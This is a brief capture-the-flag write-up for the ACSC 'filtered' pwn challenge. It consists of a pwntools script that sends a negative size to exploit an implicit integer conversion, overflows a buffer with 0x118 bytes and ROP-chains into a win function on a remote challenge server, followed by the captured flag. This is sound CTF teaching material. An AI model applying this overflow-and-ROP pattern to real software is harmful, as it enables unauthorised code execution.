# filtered [pwn/100]
First blood:
```python
from pwn import *
context.binary = 'filtered'
#r = context.binary.process()
r = remote('167.99.78.201', 9001)
r.sendlineafter("Size: ", '-1')
R = ROP(context.binary)
R.raw(b'a'*0x118)
R.win()
r.sendlineafter("Data: ", R.chain())

r.interactive()
```
`ACSC{GCC_d1dn'7_sh0w_w4rn1ng_f0r_1mpl1c17_7yp3_c0nv3rs10n}`
